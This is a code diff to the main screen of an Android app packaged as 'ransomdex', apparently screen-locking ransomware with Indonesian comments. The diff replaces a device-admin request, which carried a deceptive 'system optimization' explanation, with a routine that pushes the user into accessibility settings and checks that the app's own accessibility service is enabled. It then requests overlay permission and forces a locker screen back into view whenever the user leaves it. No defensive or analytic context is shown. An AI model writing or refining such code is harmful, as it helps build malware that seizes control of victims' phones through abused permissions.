@@ -1,20 +1,16 @@
 package com.bondex.ransomdex;
 
 import android.app.Activity;
-import android.app.admin.DevicePolicyManager;
-import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.net.Uri;
 import android.os.Bundle;
 import android.provider.Settings;
+import android.text.TextUtils;
 
 public class MainActivity extends Activity {
 
     private static final int ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE = 5469;
-    private static final int ACTION_DEVICE_ADMIN_REQUEST_CODE = 1001;
-    private DevicePolicyManager devicePolicyManager;
-    private ComponentName adminComponent;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -23,29 +19,22 @@ public class MainActivity extends Activity {
         // Hilangkan animasi masuk agar tidak flicker
         overridePendingTransition(0, 0);
 
-        devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
-        adminComponent = new ComponentName(this, AdminReceiver.class);
-
-        // Minta Izin Admin dulu, baru Overlay
-        if (!devicePolicyManager.isAdminActive(adminComponent)) {
-            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
-            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
-            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "This app requires system optimization privileges.");
-            startActivityForResult(intent, ACTION_DEVICE_ADMIN_REQUEST_CODE);
-        } else {
-            // Jika Admin sudah aktif, baru cek izin overlay
-            checkPermission();
+        // 1. Cek Accessibility dulu. Ini prioritas utama.
+        if (!isAccessibilityEnabled()) {
+            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+            startActivity(intent);
+            return;
         }
+
+        // 2. Jika Accessibility sudah aktif, minta izin Overlay
+        checkPermission();
     }
 
     @Override
     public void onWindowFocusChanged(boolean hasFocus) {
         super.onWindowFocusChanged(hasFocus);
-        // Hanya tarik paksa kembali jika izin SUDAH lengkap semua
-        // Jika masih dalam proses minta izin, jangan di-lock dulu
-        if (!hasFocus && 
-            devicePolicyManager.isAdminActive(adminComponent) && 
-            Settings.canDrawOverlays(this)) {
+        // Tarik kembali jika Accessibility dan Overlay sudah aktif
+        if (!hasFocus && isAccessibilityEnabled() && Settings.canDrawOverlays(this)) {
             startLocker();
         }
     }
@@ -72,16 +61,34 @@ public class MainActivity extends Activity {
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
         
-        if (requestCode == ACTION_DEVICE_ADMIN_REQUEST_CODE) {
-            // Setelah kembali dari request Admin, baru cek/minta Overlay
-            checkPermission();
-        } 
-        else if (requestCode == ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE) {
+        if (requestCode == ACTION_MANAGE_OVERLAY_PERMISSION_REQUEST_CODE) {
             // Setelah kembali dari Overlay, baru nyalakan loker
             if (Settings.canDrawOverlays(this)) {
                 startLocker();
             }
         }
+    }
+
+    private boolean isAccessibilityEnabled() {
+        int accessibilityEnabled = 0;
+        final String service = getPackageName() + "/" + CustomAccessibilityService.class.getCanonicalName();
+        try {
+            accessibilityEnabled = Settings.Secure.getInt(
+                    this.getContentResolver(),
+                    android.provider.Settings.Secure.ACCESSIBILITY_ENABLED);
+        } catch (Settings.SettingNotFoundException e) {}
+
+        TextUtils.SimpleStringSplitter mStringColonSplitter = new TextUtils.SimpleStringSplitter(':');
+        if (accessibilityEnabled == 1) {
+            String settingValue = Settings.Secure.getString(this.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
+            if (settingValue != null) {
+                mStringColonSplitter.setString(settingValue);
+                while (mStringColonSplitter.hasNext()) {
+                    if (mStringColonSplitter.next().equalsIgnoreCase(service)) return true;
+                }
+            }
+        }
+        return false;
     }
 
     private void startLocker() {
